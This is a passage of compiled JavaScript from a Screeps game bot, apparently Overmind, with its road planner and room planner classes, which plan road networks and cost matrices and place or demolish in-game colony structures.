        this.memory.roadCoverage = totalRoadCount / totalPathLength;
    }
    computeRoadCoverage(storagePos, destination) {
        const ret = Pathing.findPath(storagePos, destination, { terrainCosts: { plainCost: 2, swampCost: 10 } });
        const path = ret.path;
        const roomNames = _.unique(_.map(path, pos => pos.roomName));
        // If you have vision or cached vision of the room
        if (_.all(roomNames, roomName => Game.rooms[roomName] || $.costMatrixRecall(roomName, MatrixTypes.default))) {
            let roadCount = 0;
            for (const pos of path) {
                if (Game.rooms[pos.roomName]) {
                    if (pos.lookForStructure(STRUCTURE_ROAD)) {
                        roadCount++;
                    }
                }
                else {
                    const mat = $.costMatrixRecall(pos.roomName, MatrixTypes.default);
                    if (mat) {
                        if (mat.get(pos.x, pos.y) == 1) {
                            roadCount++;
                        }
                    }
                    else { // shouldn't happen
                        log.warning(`No vision or recalled cost matrix in room ${pos.roomName}! (Why?)`);
                    }
                }
            }
            return { roadCount: roadCount, length: path.length };
        }
    }
    recalculateRoadNetwork(storagePos, obstacles) {
        this.buildRoadNetwork(storagePos, obstacles);
        this.finalize();
    }
    // Connect commandCenter to hatchery, upgradeSites, and all miningSites, and place containers
    buildRoadNetwork(storagePos, obstacles) {
        this.costMatrices = {};
        this.roadPositions = [];
        const destinations = _.sortBy(this.colony.destinations, destination => destination.order);
        // Connect commandCenter to each destination in colony
        for (const destination of destinations) {
            this.planRoad(storagePos, destination.pos, obstacles);
        }
        this.formatRoadPositions();
    }
    // Plan a road between two locations avoiding a list of planned obstacles; pos1 should be storage for best results
    planRoad(pos1, pos2, obstacles) {
        // Find the shortest path, preferentially stepping on tiles with road routing flags on them
        const roadPath = this.generateRoadPath(pos1, pos2, obstacles);
        if (roadPath) {
            this.roadPositions = this.roadPositions.concat(roadPath);
        }
    }
    generateRoadPlanningCostMatrix(roomName, obstacles) {
        const matrix = new PathFinder.CostMatrix();
        const terrain = Game.map.getRoomTerrain(roomName);
        for (let y = 0; y < 50; ++y) {
            for (let x = 0; x < 50; ++x) {
                switch (terrain.get(x, y)) {
                    case TERRAIN_MASK_SWAMP:
                        matrix.set(x, y, SWAMP_COST);
                        break;
                    case TERRAIN_MASK_WALL:
                        if (x != 0 && y != 0 && x != 49 && y != 49) {
                            // Can't tunnel through walls on edge tiles
                            matrix.set(x, y, WALL_COST);
                        }
                        break;
                    default: // plain
                        matrix.set(x, y, PLAIN_COST);
                        break;
                }
            }
        }
        for (const pos of obstacles) {
            if (pos.roomName == roomName) {
                matrix.set(pos.x, pos.y, 0xff);
            }
        }
        const room = Game.rooms[roomName];
        if (room) {
            const impassibleStructures = [];
            _.forEach(room.find(FIND_STRUCTURES), (s) => {
                if (!s.isWalkable) {
                    impassibleStructures.push(s);
                }
            });
            _.forEach(impassibleStructures, s => matrix.set(s.pos.x, s.pos.y, 0xff));
            // Set passability of construction sites
            _.forEach(room.find(FIND_MY_CONSTRUCTION_SITES), (site) => {
                if (!site.isWalkable) {
                    matrix.set(site.pos.x, site.pos.y, 0xff);
                }
            });
        }
        return matrix;
    }
    /* Generates a road path and modifies cost matrices to encourage merging with future roads */
    generateRoadPath(origin, destination, obstacles) {
        const callback = (roomName) => {
            if (!this.colony.roomNames.includes(roomName)) { // only route through colony rooms
                return false;
            }
            if (Pathing.shouldAvoid(roomName) && roomName != origin.roomName && roomName != destination.roomName) {
                return false;
            }
            if (!this.costMatrices[roomName]) {
                this.costMatrices[roomName] = this.generateRoadPlanningCostMatrix(roomName, obstacles);
            }
            return this.costMatrices[roomName];
        };
        const ret = PathFinder.search(origin, { pos: destination, range: 1 }, { roomCallback: callback, maxOps: 40000 });
        if (ret.incomplete) {
            log.warning(`Roadplanner for ${this.colony.print}: could not plan road path!`);
            return;
        }
        // Reduce the cost of planned paths to encourage road overlap for future pathing
        if (RoadPlanner_1.settings.encourageRoadMerging) {
            for (const i of _.range(ret.path.length)) {
                const pos = ret.path[i];
                if (i % 2 == 0 && this.costMatrices[pos.roomName] && !pos.isEdge) {
                    this.costMatrices[pos.roomName].set(pos.x, pos.y, EXISTING_PATH_COST);
                }
            }
        }
        // Return the pathfinder results
        return ret.path;
    }
    /* Ensure that the roads doesn't overlap with roads from this.map and that the positions are unique */
    formatRoadPositions() {
        // Make road position list unique
        this.roadPositions = _.unique(this.roadPositions);
        // Remove roads located on exit tiles
        _.remove(this.roadPositions, pos => pos.isEdge);
        // Remove any roads duplicated in this.map
        const roomPlannerRoads = this.roomPlanner.plannedStructurePositions(STRUCTURE_ROAD);
        if (roomPlannerRoads != undefined) {
            _.remove(this.roadPositions, pos => roomPlannerRoads.includes(pos));
        }
    }
    /* Write everything to memory after roomPlanner is closed */
    finalize() {
        // Collect all roads from this and from room planner
        let roomPlannerRoads;
        if (_.keys(this.roomPlanner.map).length > 0) { // use active map
            roomPlannerRoads = this.roomPlanner.map[STRUCTURE_ROAD];
        }
        else { // retrieve from memory
            if (this.roomPlanner.memory.bunkerData && this.roomPlanner.memory.bunkerData.anchor) {
                const layout = this.roomPlanner.getStructureMapForBunkerAt(this.roomPlanner.memory.bunkerData.anchor);
                roomPlannerRoads = layout[STRUCTURE_ROAD];
            }
            else if (this.roomPlanner.memory.mapsByLevel) {
                roomPlannerRoads = _.map(this.roomPlanner.memory.mapsByLevel[8][STRUCTURE_ROAD], protoPos => derefRoomPosition(protoPos));
            }
            else {
                log.error(`RoadPlanner@${this.colony.room.print}: could not get road positions from room planner!`);
                roomPlannerRoads = [];
            }
        }
        const allRoadPos = _.compact(this.roadPositions.concat(roomPlannerRoads));
        // Encode the coordinates of the road as keys in a truthy hash table for fast lookup
        this.memory.roadLookup = {};
        for (const pos of allRoadPos) {
            if (!this.memory.roadLookup[pos.roomName])
                this.memory.roadLookup[pos.roomName] = {};
            this.memory.roadLookup[pos.roomName][pos.coordName] = true;
        }
    }
    init() {
    }
    static shouldBuild(structureType, pos) {
        if (!pos.room)
            return false;
        const buildings = _.filter(pos.lookFor(LOOK_STRUCTURES), s => s && s.structureType == structureType);
        const sites = pos.lookFor(LOOK_CONSTRUCTION_SITES);
        if (!buildings || buildings.length == 0) {
            if (!sites || sites.length == 0) {
                return true;
            }
        }
        return false;
    }
    /* Create construction sites for any buildings that need to be built */
    buildMissing() {
        // Max buildings that can be placed each tick
        let count = RoomPlanner.settings.maxSitesPerColony - this.colony.constructionSites.length;
        // Build missing roads
        let roadPositions = [];
        for (const roomName in this.memory.roadLookup) {
            for (const coords of _.keys(this.memory.roadLookup[roomName])) {
                const [x, y] = coords.split(':');
                roadPositions.push(new RoomPosition(parseInt(x, 10), parseInt(y, 10), roomName));
            }
        }
        const origin = (this.colony.storage || this.colony.hatchery || this.colony).pos;
        roadPositions = _.sortBy(roadPositions, pos => pos.getMultiRoomRangeTo(origin));
        for (const pos of roadPositions) {
            if (count > 0 && RoomPlanner.canBuild(STRUCTURE_ROAD, pos)) {
                const ret = pos.createConstructionSite(STRUCTURE_ROAD);
                if (ret != OK) {
                    log.warning(`${this.colony.name}: couldn't create road site at ${pos.print}. Result: ${ret}`);
                }
                else {
                    count--;
                }
            }
        }
    }
    /* Quick lookup for if a road should be in this position. Roads returning false won't be maintained. */
    roadShouldBeHere(pos) {
        // Initial migration code, can delete later
        if (this.memory.roadLookup[pos.roomName]) {
            return this.memory.roadLookup[pos.roomName][pos.coordName];
        }
        return false;
    }
    run() {
        if (this.roomPlanner.active) {
            if (this.roomPlanner.storagePos) {
                this.buildRoadNetwork(this.roomPlanner.storagePos, this.roomPlanner.getObstacles());
            }
            this.visuals();
        }
        else {
            // Once in a blue moon, recalculate the entire network and write to memory to keep it up to date
            if (Game.time % RoadPlanner_1.settings.recalculateRoadNetworkInterval == this.colony.id) {
                if (this.roomPlanner.storagePos) {
                    this.recalculateRoadNetwork(this.roomPlanner.storagePos, this.roomPlanner.getObstacles());
                }
            }
            // Recompute coverage to destinations
            if (Game.time % getAllColonies().length == this.colony.id && this.roomPlanner.storagePos) {
                this.recomputeRoadCoverages(this.roomPlanner.storagePos);
            }
            // Build missing roads
            if (this.colony.level >= RoadPlanner_1.settings.buildRoadsAtRCL && this.roomPlanner.shouldRecheck(3)) {
                this.buildMissing();
            }
        }
    }
    visuals() {
        // Draw the map
        Visualizer.drawRoads(this.roadPositions);
    }
};
RoadPlanner.settings = {
    encourageRoadMerging: true,
    recalculateRoadNetworkInterval: onPublicServer() ? 3000 : 1000,
    recomputeCoverageInterval: onPublicServer() ? 1000 : 500,
    buildRoadsAtRCL: 4,
};
RoadPlanner = RoadPlanner_1 = __decorate([
    profile
], RoadPlanner);

var RoomPlanner_1;
const memoryDefaults$2 = {
    active: true,
    savedFlags: [],
};
function getAllStructureCoordsFromLayout(layout, rcl) {
    if (!layout[rcl]) {
        return [];
    }
    const positionsByType = layout[rcl].buildings;
    let coords = [];
    for (const structureType in positionsByType) {
        coords = coords.concat(positionsByType[structureType].pos);
    }
    return _.unique(coords, coord => coord.x + 50 * coord.y);
}
function translatePositions(positions, fromAnchor, toAnchor) {
    const dx = toAnchor.x - fromAnchor.x;
    const dy = toAnchor.y - fromAnchor.y;
    const newPositions = [];
    for (const pos of positions) {
        newPositions.push(new RoomPosition(pos.x + dx, pos.y + dy, pos.roomName));
    }
    return newPositions;
}
/**
 * The room planner handles structure placement within a room automatically or (in manual or semiautomatic mode) with
 * manual guidance from room planner flags.
 */
let RoomPlanner = RoomPlanner_1 = class RoomPlanner {
    constructor(colony) {
        this.colony = colony;
        this.memory = Mem.wrap(this.colony.memory, 'roomPlanner', memoryDefaults$2);
        this.barrierPlanner = new BarrierPlanner(this);
        this.roadPlanner = new RoadPlanner(this);
        this.refresh();
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'roomPlanner', memoryDefaults$2);
        this.placements = {
            hatchery: undefined,
            commandCenter: undefined,
            bunker: undefined,
        };
        this.plan = {};
        this.map = {};
        this.barrierPlanner.refresh();
        this.roadPlanner.refresh();
        if (this.active && Game.time % 25 == 0) {
            log.alert(`RoomPlanner for ${this.colony.room.print} is still active! Close to save CPU.`);
        }
    }
    get active() {
        return this.memory.active;
    }
    set active(active) {
        this.memory.active = active;
        if (active) {
            this.reactivate();
        }
    }
    /**
     * Recall or reconstruct the appropriate map from memory
     */
    recallMap(level = this.colony.controller.level) {
        if (this.memory.bunkerData && this.memory.bunkerData.anchor) {
            this.map = this.getStructureMapForBunkerAt(this.memory.bunkerData.anchor, level);
        }
        else if (this.memory.mapsByLevel) {
            this.map = _.mapValues(this.memory.mapsByLevel[level], posArr => _.map(posArr, protoPos => derefRoomPosition(protoPos)));
        }
    }
    /**
     * Return a list of room positions for planned structure locations at RCL8 (or undefined if plan isn't made yet)
     */
    plannedStructurePositions(structureType) {
        if (this.map[structureType]) {
            return this.map[structureType];
        }
        if (this.memory.bunkerData && this.memory.bunkerData.anchor) {
            return this.getBunkerStructurePlacement(structureType, this.memory.bunkerData.anchor);
        }
        const roomMap = this.memory.mapsByLevel ? this.memory.mapsByLevel[8] : undefined;
        if (roomMap && roomMap[structureType]) {
            return _.map(roomMap[structureType], protoPos => derefRoomPosition(protoPos));
        }
    }
    /**
     * Return the planned location of the storage structure
     */
    get storagePos() {
        if (this.placements.commandCenter) {
            return this.placements.commandCenter;
        }
        const positions = this.plannedStructurePositions(STRUCTURE_STORAGE);
        if (positions) {
            return positions[0];
        }
    }
    /**
     * Return the planned location of the spawning structure
     */
    get hatcheryPos() {
        if (this.placements.hatchery) {
            return this.placements.hatchery;
        }
        const positions = this.plannedStructurePositions(STRUCTURE_SPAWN);
        if (positions) {
            return positions[0];
        }
    }
    get bunkerPos() {
        if (this.placements.bunker) {
            return this.placements.bunker;
        }
        if (this.memory.bunkerData && this.memory.bunkerData.anchor) {
            return new RoomPosition(this.memory.bunkerData.anchor.x, this.memory.bunkerData.anchor.y, this.colony.name);
        }
    }
    reactivate() {
        // Reinstantiate flags
        for (const protoFlag of this.memory.savedFlags) {
            const pos = derefRoomPosition(protoFlag.pos);
            const result = pos.createFlag(undefined, COLOR_WHITE, protoFlag.secondaryColor);
            if (typeof result == 'string') {
                Memory.flags[result] = protoFlag.memory; // restore old memory
            }
        }
        this.memory.savedFlags = [];
        // Display the activation message
        const msg = [
            `Room planner activated for ${this.colony.name}. Reinstantiating flags from previous session on next tick.`,
            'Place colony components with room planner flags:',
            bullet + 'Place bunker (recommended)  white/red',
            bullet + 'Place hatchery:             white/green',
            bullet + 'Place command center:       white/blue',
            // 'Set component rotation by writing an angle (0,90,180,270 or 0,1,2,3) to flag.memory.rotation.',
            'Finalize layout '
        ];
        _.forEach(msg, command => console.log(command));
    }
    /**
     * Run the room planner to generate a plan and map
     */
    make(level = 8) {
        // Reset everything
        this.plan = {};
        this.map = {};
        // Generate a plan, placing components by flags
        this.plan = this.generatePlan(level);
        // Flatten it into a map
        this.map = this.mapFromPlan(this.plan);
    }
    /**
     * Adds the specified structure directly to the map. Only callable after this.map is generated.
     * Doesn't check for conflicts, so don't use freely.
     */
    placeStructure(type, pos) {
        if (!this.map[type])
            this.map[type] = [];
        this.map[type].push(pos);
    }
    addComponent(componentName, pos, rotation = 0) {
        this.placements[componentName] = pos;
    }
    /**
     * Switcher that takes a component name and returns a layout
     */
    getLayout(name) {
        switch (name) {
            case 'hatchery':
                return hatcheryLayout;
            case 'commandCenter':
                return commandCenterLayout;
            case 'bunker':
                return bunkerLayout;
        }
    }
    /**
     * Generate a plan of component placements for a given RCL
     */
    generatePlan(level = 8) {
        const plan = {};
        for (const name in this.placements) {
            const layout = this.getLayout(name);
            if (layout) {
                const anchor = layout.data.anchor;
                const pos = this.placements[name];
                if (!pos)
                    continue;
                // let rotation: number = pos!.lookFor(LOOK_FLAGS)[0]!.memory.rotation || 0;
                const componentMap = this.parseLayout(layout, level);
                this.translateComponent(componentMap, anchor, pos);
                // if (rotation != 0) this.rotateComponent(componentMap, pos!, rotation);
                plan[name] = {
                    map: componentMap,
                    pos: new RoomPosition(anchor.x, anchor.y, this.colony.name),
                    rotation: 0,
                };
            }
        }
        return plan;
    }
    /**
     * Generate a map of (structure type: RoomPositions[]) for a given layout
     */
    parseLayout(structureLayout, level = 8) {
        const map = {};
        const layout = structureLayout[level];
        if (layout) {
            for (const buildingName in layout.buildings) {
                map[buildingName] = _.map(layout.buildings[buildingName].pos, pos => new RoomPosition(pos.x, pos.y, this.colony.name));
            }
        }
        return map;
    }
    /**
     * Generate a flatened map from a plan
     */
    mapFromPlan(plan) {
        const map = {};
        const componentMaps = _.map(plan, componentPlan => componentPlan.map);
        const structureNames = _.unique(_.flatten(_.map(componentMaps, map => _.keys(map))));
        for (const name of structureNames) {
            map[name] = _.compact(_.flatten(_.map(componentMaps, map => map[name])));
        }
        return map;
    }
    /**
     * Aligns the component position to the desired position; operations done in-place
     */
    translateComponent(map, fromPos, toPos) {
        const dx = toPos.x - fromPos.x;
        const dy = toPos.y - fromPos.y;
        for (const structureType in map) {
            for (const pos of map[structureType]) {
                pos.x += dx;
                pos.y += dy;
            }
        }
    }
    // TODO: component rotation isn't currently fully supported
    /* Rotates component positions about a pivot point counterclockwise by the given angle; done in-place */
    rotateComponent(map, pivot, angle) {
        let R = ([x, y]) => ([x, y]);
        if (angle == 0) {
            return;
        }
        else if (angle == 90 || angle == 1) {
            R = ([x, y]) => ([-y, x]);
        }
        else if (angle == 180 || angle == 2) {
            R = ([x, y]) => ([-x, -y]);
        }
        else if (angle == 270 || angle == 3) {
            R = ([x, y]) => ([y, -x]);
        }
        // Apply the rotation to the map
        let offset, dx, dy;
        for (const structureType in map) {
            for (const pos of map[structureType]) {
                offset = [pos.x - pivot.x, pos.y - pivot.y];
                [dx, dy] = R(offset);
                pos.x = pivot.x + dx;
                pos.y = pivot.y + dy;
            }
        }
    }
    /**
     * Get bunker building placements as a StructureMap
     */
    getStructureMapForBunkerAt(anchor, level = 8) {
        const dx = anchor.x - bunkerLayout.data.anchor.x;
        const dy = anchor.y - bunkerLayout.data.anchor.y;
        const structureLayout = _.mapValues(bunkerLayout[level].buildings, obj => obj.pos);
        return _.mapValues(structureLayout, coordArr => _.map(coordArr, coord => new RoomPosition(coord.x + dx, coord.y + dy, this.colony.name)));
    }
    /**
     * Get the placement for a single type of structure for bunker layout
     */
    getBunkerStructurePlacement(structureType, anchor, level = 8) {
        const dx = anchor.x - bunkerLayout.data.anchor.x;
        const dy = anchor.y - bunkerLayout.data.anchor.y;
        return _.map(bunkerLayout[level].buildings[structureType].pos, coord => new RoomPosition(coord.x + dx, coord.y + dy, this.colony.name));
    }
    /**
     * Generates a list of impassible obstacles from this.map or from this.memory.map
     */
    getObstacles() {
        let obstacles = [];
        const passableStructureTypes = [STRUCTURE_ROAD, STRUCTURE_CONTAINER, STRUCTURE_RAMPART];
        if (_.keys(this.map).length > 0) { // if room planner has made the map, use that
            for (const structureType in this.map) {
                if (!passableStructureTypes.includes(structureType)) {
                    obstacles = obstacles.concat(this.map[structureType]);
                }
            }
        }
        else { // else, serialize from memory
            if (this.memory.bunkerData && this.memory.bunkerData.anchor) {
                const structureMap = this.getStructureMapForBunkerAt(this.memory.bunkerData.anchor);
                for (const structureType in structureMap) {
                    if (!passableStructureTypes.includes(structureType)) {
                        obstacles = obstacles.concat(structureMap[structureType]);
                    }
                }
            }
            else if (this.memory.mapsByLevel) {
                for (const structureType in this.memory.mapsByLevel[8]) {
                    if (!passableStructureTypes.includes(structureType)) {
                        obstacles = obstacles.concat(_.map(this.memory.mapsByLevel[8][structureType], protoPos => derefRoomPosition(protoPos)));
                    }
                }
            }
        }
        return _.unique(obstacles);
    }
    /**
     * Check to see if there are any structures that can't be built
     */
    findCollision(ignoreRoads = false) {
        const terrain = Game.map.getRoomTerrain(this.colony.room.name);
        for (const structureType in this.map) {
            if (ignoreRoads && structureType == STRUCTURE_ROAD) {
                continue;
            }
            for (const pos of this.map[structureType]) {
                if (terrain.get(pos.x, pos.y) == TERRAIN_MASK_WALL) {
                    return pos;
                }
            }
        }
    }
    /**
     * Write everything to memory at the end of activation. If ignoreRoads is set, it will allow collisions with
     * roads, but will continue to alert you every time it fails to build a road in the terrain pos (WIP)
     */
    finalize(ignoreRoads = false) {
        const collision = this.findCollision(ignoreRoads);
        if (collision) {
            log.warning(`Invalid layout: collision detected at ${collision.print}!`);
            return;
        }
        const layoutIsValid = (!!this.placements.commandCenter && !!this.placements.hatchery)
            || !!this.placements.bunker;
        if (layoutIsValid) { // Write everything to memory
            // Generate maps for each rcl
            delete this.memory.bunkerData;
            delete this.memory.mapsByLevel;
            if (this.placements.bunker) {
                this.memory.bunkerData = {
                    anchor: this.placements.bunker,
                };
            }
            else {
                this.memory.mapsByLevel = {};
                for (let rcl = 1; rcl <= 8; rcl++) {
                    this.make(rcl);
                    this.memory.mapsByLevel[rcl] = this.map;
                }
            }
            // Finalize the barrier planner
            this.barrierPlanner.finalize();
            // Finalize the road planner
            this.roadPlanner.finalize();
            // Save flags and remove them
            const flagsToWrite = _.filter(this.colony.flags, flag => flag.color == COLOR_WHITE);
            for (const flag of flagsToWrite) {
                this.memory.savedFlags.push({
                    secondaryColor: flag.secondaryColor,
                    pos: flag.pos,
                    memory: flag.memory,
                });
                flag.remove();
            }
            this.memory.lastGenerated = Game.time;
            console.log('Room layout and flag positions have been saved.');
            // Destroy needed buildings
            if (this.colony.level == 1) { // clear out room if setting in for first time
                this.demolishMisplacedStructures(true, true);
                // Demolish all barriers that aren't yours
                for (const barrier of this.colony.room.barriers) {
                    if (barrier.structureType == STRUCTURE_WALL || !barrier.my) {
                        barrier.destroy();
                    }
                }
            }
            this.memory.recheckStructuresAt = Game.time + 3;
            this.active = false;
        }
        else {
            log.warning('Not a valid room layout! Must have both hatchery and commandCenter placements ' +
                'or bunker placement.');
        }
    }
    /* Whether a constructionSite should be placed at a position */
    static canBuild(structureType, pos) {
        if (!pos.room)
            return false;
        const buildings = _.filter(pos.lookFor(LOOK_STRUCTURES), s => s && s.structureType == structureType);
        const sites = pos.lookFor(LOOK_CONSTRUCTION_SITES);
        if (!buildings || buildings.length == 0) {
            if (!sites || sites.length == 0) {
                return true;
            }
        }
        return false;
    }
    /**
     * Whether a structure (or constructionSite) of given type should be at location.
     */
    structureShouldBeHere(structureType, pos, level = this.colony.controller.level) {
        if (structureType == STRUCTURE_ROAD) {
            return this.roadShouldBeHere(pos);
        }
        else if (structureType == STRUCTURE_RAMPART) {
            return this.barrierPlanner.barrierShouldBeHere(pos);
        }
        else if (structureType == STRUCTURE_EXTRACTOR) {
            return pos.lookFor(LOOK_MINERALS).length > 0;
        }
        else {
            if (_.isEmpty(this.map)) {
                this.recallMap(level);
            }
            const positions = this.map[structureType];
            if (positions && _.find(positions, p => p.isEqualTo(pos))) {
                return true;
            }
            if (structureType == STRUCTURE_CONTAINER || structureType == STRUCTURE_LINK) {
                const thingsBuildingLinksAndContainers = _.map([...this.colony.room.sources,
                    this.colony.room.mineral,
                    this.colony.controller], thing => thing.pos);
                const maxRange = 4;
                return pos.findInRange(thingsBuildingLinksAndContainers, 4).length > 0;
            }
        }
        return false;
    }
    /**
     * Demolish all hostile structures in the room
     */
    demolishHostileStructures(destroyStorageUnits = false) {
        _.forEach(this.colony.room.walls, wall => wall.destroy()); // overmind never uses walls
        for (const structure of _.filter(this.colony.room.hostileStructures)) {
            if ((structure.structureType != STRUCTURE_STORAGE && structure.structureType != STRUCTURE_TERMINAL)
                || destroyStorageUnits) {
                structure.destroy();
            }
        }
    }
    /**
     * Remove all hostile constructionSites and ones which are misplaced
     */
    removeMisplacedConstructionSites() {
        for (const site of this.colony.room.find(FIND_CONSTRUCTION_SITES)) {
            if (site.owner.username != MY_USERNAME) {
                site.remove();
            }
            else if (!this.structureShouldBeHere(site.structureType, site.pos)) {
                site.remove();
            }
        }
    }
    /**
     * Create construction sites for any buildings that need to be built
     */
    demolishMisplacedStructures(skipRamparts = true, destroyAllStructureTypes = false) {
        this.demolishHostileStructures();
        this.removeMisplacedConstructionSites();
        if (getAllColonies().length <= 1 && !this.colony.storage) {
            return; // Not safe to move structures until you have multiple colonies or a storage
        }
        // Start terminal evacuation if it needs to be moved
        if (this.colony.terminal) {
            if (this.colony.storage && !this.structureShouldBeHere(STRUCTURE_STORAGE, this.colony.storage.pos)
                || !this.structureShouldBeHere(STRUCTURE_TERMINAL, this.colony.terminal.pos)) {
                DirectiveTerminalRebuildState.createIfNotPresent(this.colony.terminal.pos, 'pos');
            }
        }
        // Max buildings that can be placed each tick
        const count = RoomPlanner_1.settings.maxSitesPerColony - this.colony.constructionSites.length;
        // Recall the appropriate map
        this.recallMap();
        if (!this.map || this.map == {}) { // in case a map hasn't been generated yet
            log.info(this.colony.name + ' does not have a room plan yet! Unable to demolish errant structures.');
        }
        // Destroy extractor if needed
        if (this.colony.room.extractor && !this.colony.room.extractor.my) {
            this.colony.room.extractor.destroy();
        }
        // Build missing structures from room plan
        this.memory.relocating = false;
        for (const priority of DemolishStructurePriorities) {
            const structureType = priority.structureType;
            // // don't demolish bunker baby ramparts until the new ones are sufficiently big
            // if (structureType == STRUCTURE_RAMPART && this.colony.layout == 'bunker') {
            //  let bunkerBarriers = _.filter(this.colony.room.barriers, b => insideBunkerBounds(b.pos, this.colony));
            //  let avgBarrierHits = (_.sum(bunkerBarriers, barrier => barrier.hits) / bunkerBarriers.length) || 0;
            //  if (avgBarrierHits < 1e+6) continue;
            // }
            const maxRemoved = priority.maxRemoved || Infinity;
            let removeCount = 0;
            let structures = _.filter(this.colony.room.find(FIND_STRUCTURES), s => s.structureType == structureType);
            if (structureType == STRUCTURE_WALL) {
                structures = _.filter(structures, wall => wall.hits != undefined); // can't destroy newbie walls
            }
            // Loop through all structures and conditionally remove ones which are misplaced
            for (const structure of structures) {
                if (!this.structureShouldBeHere(structureType, structure.pos) ||
                    (isOwnedStructure(structure) && !structure.my)) {
                    // Don't demolish your own ramparts, just let them decay
                    if (skipRamparts && !destroyAllStructureTypes && structure.structureType == STRUCTURE_RAMPART
                        && structure.my) {
                        continue;
                    }
                    // remove misplaced structures or hostile owned structures, with exceptions below
                    if (this.colony.level < 4
                        && (structureType == STRUCTURE_STORAGE || structureType == STRUCTURE_TERMINAL)) {
                        break; // don't destroy terminal or storage when under RCL4 - can use energy inside
                    }
                    if (structureType != STRUCTURE_WALL && structureType != STRUCTURE_RAMPART) {
                        this.memory.relocating = true;
                    }
                    // Don't remove the terminal until you have rebuilt storage
                    if (this.colony.level >= 6 && structureType == STRUCTURE_TERMINAL) {
                        if (!this.colony.storage) {
                            log.info(`${this.colony.name}: waiting until storage is built to remove terminal`);
                            return;
                        }
                        else if (this.colony.terminal &&
                            _.sum(this.colony.terminal.store) - this.colony.terminal.energy > 1000) {
                            log.info(`${this.colony.name}: waiting on resources to evacuate before removing terminal`);
                            return;
                        }
                        else if (this.colony.storage &&
                            this.structureShouldBeHere(STRUCTURE_STORAGE, this.colony.storage.pos) &&
                            this.colony.storage.energy
                                < Energetics.settings.storage.energy.destroyTerminalThreshold) {
                            log.info(`${this.colony.name}: waiting to move energy to storage before removing terminal`);
                            return;
                        }
                    }
                    // Only remove a maximum number of structures at a time
                    const amountMissing = CONTROLLER_STRUCTURES[structureType][this.colony.level] - structures.length
                        + removeCount;
                    if (amountMissing < maxRemoved) {
                        if (structureType == STRUCTURE_SPAWN && this.colony.spawns.length == 1) {
                            const spawnCost = 15000;
                            if (this.colony.assets[RESOURCE_ENERGY] < spawnCost) {
                                log.warning(`${this.colony.print}: Unsafe to destroy misplaced spawn: ` +
                                    `${this.colony.assets[RESOURCE_ENERGY]}/${spawnCost} energy available`);
                                if (!destroyAllStructureTypes) {
                                    return;
                                }
                            }
                            const workTicksNeeded = 15000 / BUILD_POWER;
                            const workTicksAvailable = _.sum(this.colony.overlords.work.workers, worker => worker.getActiveBodyparts(WORK) * (worker.ticksToLive || 0));
                            if (workTicksAvailable < workTicksNeeded) {
                                log.warning(`${this.colony.print}: Unsafe to destroy misplaced spawn: ` +
                                    `${workTicksAvailable}/${workTicksNeeded} [WORK * ticks] available`);
                                if (!destroyAllStructureTypes) {
                                    return;
                                }
                            }
                        }
                        const result = structure.destroy();
                        if (result != OK) {
                            log.warning(`${this.colony.name}: couldn't destroy structure of type ` +
                                `"${structureType}" at ${structure.pos.print}. Result: ${result}`);
                        }
                        else {
                            log.info(`${this.colony.name}: destroyed ${structureType} at ${structure.pos.print}`);
                        }
                        removeCount++;
                        this.memory.recheckStructuresAt = Game.time + RoomPlanner_1.settings.recheckAfter;
                    }
                }
            }
            if (this.memory.relocating && !destroyAllStructureTypes) {
                return;
            }
        }
    }
    /**
     * Create construction sites for any buildings that need to be built
     */
    buildMissingStructures() {
        // Max buildings that can be placed each tick
        let count = RoomPlanner_1.settings.maxSitesPerColony - this.colony.constructionSites.length;
        // Recall the appropriate map
        this.recallMap();
        if (!this.map || this.map == {}) { // in case a map hasn't been generated yet
            log.info(this.colony.name + ' does not have a room plan yet! Unable to build missing structures.');
        }
        // Build missing structures from room plan
        for (const structureType of BuildPriorities) {
            if (this.map[structureType]) {
                for (const pos of this.map[structureType]) {
                    if (count > 0 && RoomPlanner_1.canBuild(structureType, pos)) {
                        const result = pos.createConstructionSite(structureType);
                        if (result != OK) {
                            const structures = pos.lookFor(LOOK_STRUCTURES);
                            for (const structure of structures) {
                                // let thisImportance = _.findIndex(BuildPriorities, type => type == structureType);
                                // let existingImportance = _.findIndex(BuildPriorities,
                                //                                   type => type == structure.structureType);
                                const safeTypes = [STRUCTURE_STORAGE, STRUCTURE_TERMINAL, STRUCTURE_SPAWN];
                                // Destroy the structure if it is less important and not protected
                                if (!this.structureShouldBeHere(structure.structureType, pos)
                                    && !safeTypes.includes(structure.structureType)) {
                                    const result = structure.destroy();
                                    log.info(`${this.colony.name}: destroyed ${structure.structureType} at` +
                                        ` ${structure.pos.print}`);
                                    if (result == OK) {
                                        this.memory.recheckStructuresAt = Game.time +
                                            RoomPlanner_1.settings.recheckAfter;
                                    }
                                }
                            }
                            log.warning(`${this.colony.name}: couldn't create construction site of type ` +
                                `"${structureType}" at ${pos.print}. Result: ${result}`);
                        }
                        else {
                            count--;
                            this.memory.recheckStructuresAt = Game.time + RoomPlanner_1.settings.recheckAfter;
                        }
                    }
                }
            }
        }
        // Build extractor on mineral deposit if not already present
        const mineral = this.colony.room.find(FIND_MINERALS)[0];
        if (mineral) {
            const extractor = mineral.pos.lookForStructure(STRUCTURE_EXTRACTOR);
            if (!extractor) {
                mineral.pos.createConstructionSite(STRUCTURE_EXTRACTOR);
            }
        }
    }
    /**
     * Calculate where the link will be built
     */
    calculateLinkPos(anchor) {
        if (anchor.isEqualTo(this.colony.controller.pos)) {
            return this.calculateUpgradeSiteLinkPos();
        }
        let originPos;
        if (this.colony.storage) {
            originPos = this.colony.storage.pos;
        }
        else if (this.storagePos) {
            originPos = this.storagePos;
        }
        if (originPos) {
            const path = Pathing.findShortestPath(anchor, originPos).path;
            return _.find(path, pos => anchor.getRangeTo(pos) == 2);
        }
    }
    /**
     * Calculate where the link will be built for this site
     */
    calculateUpgradeSiteLinkPos() {
        let originPos;
        if (this.colony.storage) {
            originPos = this.colony.storage.pos;
        }
        else if (this.storagePos) {
            originPos = this.storagePos;
        }
        if (originPos && this.colony.upgradeSite.batteryPos) {
            // Build link at last location on path from origin to battery
            const path = Pathing.findShortestPath(this.colony.upgradeSite.batteryPos, originPos).path;
            return path[0];
        }
    }
    nextNeededLinkAnchor() {
        const linksEtAl = _.map([]
            .concat(this.colony.links, _.filter(this.colony.constructionSites, site => site.structureType == STRUCTURE_LINK)), s => s.pos);
        // UpgradeSite goes first
        const upgradeLink = this.colony.controller.pos.findClosestByLimitedRange(linksEtAl, 3);
        if (!upgradeLink)
            return this.colony.controller.pos;
        // MiningSites by decreasing distance
